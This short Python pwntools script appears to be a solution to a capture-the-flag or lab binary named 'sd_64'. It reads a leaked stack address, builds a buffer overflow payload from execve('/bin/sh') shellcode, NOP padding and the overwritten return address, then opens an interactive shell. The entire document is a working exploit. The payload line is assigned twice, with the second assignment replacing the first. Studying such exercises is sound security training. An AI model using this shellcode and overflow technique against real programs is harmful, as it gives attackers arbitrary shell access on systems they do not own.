#!/usr/bin/env python

import pwn

shellcode = "\x48\x31\xf6\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

Io = pwn.process("./sd_64")
address = Io.recvline()
buffer_addr = pwn.p64(int(address[-1-12:-1], 16))
print hex(pwn.u64(buffer_addr))
payload = "\x90" * (88 - len(shellcode)) + shellcode + buffer_addr
payload = shellcode + "\x90" * (88 - len(shellcode)) + buffer_addr
Io.send(payload)
Io.interactive()
